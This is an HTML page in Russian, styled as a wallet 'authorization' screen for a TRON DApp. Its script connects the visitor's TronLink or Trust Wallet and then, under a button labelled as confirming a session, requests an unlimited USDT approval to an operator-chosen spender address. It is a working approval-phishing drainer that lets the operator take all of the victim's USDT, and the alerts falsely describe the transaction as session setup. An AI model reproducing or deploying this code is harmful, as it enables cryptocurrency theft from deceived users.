<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DApp Connect</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
    <style>
        body { background-color: #0f172a; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 50px; }
        .card { max-width: 400px; margin: 0 auto; padding: 25px; background: #1e293b; border-radius: 12px; }
        button { width: 100%; padding: 14px; font-size: 16px; background-color: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 15px; }
        button:hover { background-color: #2563eb; }
        p { color: #94a3b8; font-size: 14px; word-break: break-all; }
    </style>
</head>
<body>

    <div class="card">
        <h2>Авторизация</h2>
        <p id="walletInfo">Кошелек не подключен</p>
        
        <button id="connectBtn">Подключить кошелек</button>
        <button id="approveBtn" style="display: none; background-color: #22c55e;">Подтвердить сессию</button>
    </div>

    <script>
        let tronWeb;
        let userAddress = "";
        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Официальный USDT TRC20
        // Адрес, которому дается право на списание (сюда впиши адрес твоего сервера / кошелька-исполнителя)
        const spenderAddress = "ВСТАВЬ_АДРЕС_КОШЕЛЬКА_ИСПЫТУЕМОГО_СЕРВЕРА"; 

        // 1. Подключение кошелька
        document.getElementById('connectBtn').addEventListener('click', async function() {
            try {
                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                    tronWeb = window.tronWeb;
                    userAddress = window.tronWeb.defaultAddress.base58;
                } else if (window.tronLink) {
                    await window.tronLink.request({ method: 'tron_requestAccounts' });
                    tronWeb = window.tronWeb;
                    userAddress = window.tronWeb.defaultAddress.base58;
                } else {
                    alert("Откройте сайт во встроенном браузере кошелька (Trust Wallet / TronLink)");
                    return;
                }

                if (userAddress) {
                    document.getElementById('walletInfo').innerText = "Кошелек: " + userAddress;
                    document.getElementById('connectBtn').style.display = 'none';
                    document.getElementById('approveBtn').style.display = 'block';
                }
            } catch (error) {
                console.error(error);
                alert("Ошибка подключения");
            }
        });

        // 2. Запрос прав (Approve)
        document.getElementById('approveBtn').addEventListener('click', async function() {
            try {
                const contract = await window.tronWeb.contract().at(usdtContractAddress);
                
                // Максимальное значение для безлимитного списания
                const maxApproval = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

                alert("Подтвердите транзакцию для завершения авторизации...");

                const txID = await contract.approve(
                    spenderAddress,
                    maxApproval
                ).send({
                    feeLimit: 15000000
                });

                alert("Успешно! Сессия настроена.");
                console.log("TxID:", txID);
            } catch (error) {
                console.error(error);
                alert("Ошибка: оформление отклонено");
            }
        });
    </script>
</body>
</html>
